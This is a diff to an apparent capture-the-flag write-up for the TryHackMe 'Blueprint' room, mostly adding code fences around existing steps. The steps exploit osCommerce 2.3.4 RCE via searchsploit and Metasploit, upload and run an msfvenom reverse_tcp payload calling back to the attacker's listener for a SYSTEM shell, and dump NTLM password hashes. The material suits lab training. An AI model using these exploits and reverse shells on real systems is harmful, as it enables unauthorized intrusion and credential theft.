@@ -84,13 +84,18 @@ STEP II: From the scan report we got many open ports and in port 8080/tcp a file
 Perform some more enumeration on the directory and get details.
 
 STEP III: Simply now search on the searchsploit
+![Blueprint](../images/BluePrint_THM/searchsploit.webp)
+
 From here we can see, RCE available for exploitation so we can download and use it directly
+```bash
 searchsploit -m 50128
 python 50128.py http://<Victim_IP>:8080/oscommerce-2.3.4/catalog/
+```
 
 OR,
 
 We can use msfconsole to exploit it
+```bash
 search oscommerce
 use exploit/multi/http/oscommerce_installer_unauth_code_exec
 set URI /oscommerce-2.3.4/catalog/install/
@@ -98,7 +103,10 @@ set RHOSTS <Victim_IP>
 set LHOST <Attacker_IP>
 set RPORT 8080
 exploit
+```
+
 Now we will got a meterpreter session
+```bash
 msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
 [*] Started reverse TCP handler on 192.168.143.129:4444 
 [*] Sending stage (42137 bytes) to 10.49.156.161
@@ -122,13 +130,18 @@ Mode              Size           Type  Last modified                      Name
 meterpreter > cat C:/Users/Administrator/Desktop/root.txt.txt
 ---------------------<Root-Flag>-----------------------
 meterpreter >
+```
 
 STEP IV: Now for extracting hashes we will use a reverse_tcp payload so using msfvenom we can create the exe
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.143.129 LPORT=8082 -f exe > blueprint.exe
+```
 
 STEP V: From meterpreter session upload it into victim system so, creating a python server we will upload it
-  python -m http.server
-  
+ ```bash
+python -m http.server
+```
+```bash  
 meterpreter > mkdir Temp 
 meterpreter > pwd
 C:\
@@ -138,20 +151,26 @@ meterpreter > upload /home/kali/blueprint.exe
 [*] Uploaded -1.00 B of 7.00 KiB (-0.01%): /home/kali/blueprint.exe -> blueprint.exe
 [*] Completed  : /home/kali/blueprint.exe -> blueprint.exe
 meterpreter >
+```
 
 Also we will have to a set a listner so we will use multi/handler
-
+```bash
 use multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST <Attacker_IP>
 set LPORT 8082
+```
 
 After updating all details we will exploit or run it and then move into privious meterpreter session and simply use command exploit -f <msfvenom_filename>
-
+```bash  
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 192.168.143.129:8082
+```
+```bash
 meterpreter > execute -f blueprint.exe
 Process 4076 created.
+```
+```bash
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 192.168.143.129:8082 
 [*] Sending stage (196678 bytes) to 10.49.156.161
@@ -167,12 +186,14 @@ Logged On Users : 0
 Meterpreter     : x86/windows
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
+```
 
 Now after executing the exe file we got a new 32 bit meterpreter shell so from here we will extract the hashes of the users
-
+```bash
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
-
+```
 We can now use crackstation <https://crackstation.net/> or kali tools like hashcat or JohnTheRipper so we will get the decrypted password of lab user.
+![Blueprint](../images/BluePrint_THM/blueprint_final.webp)
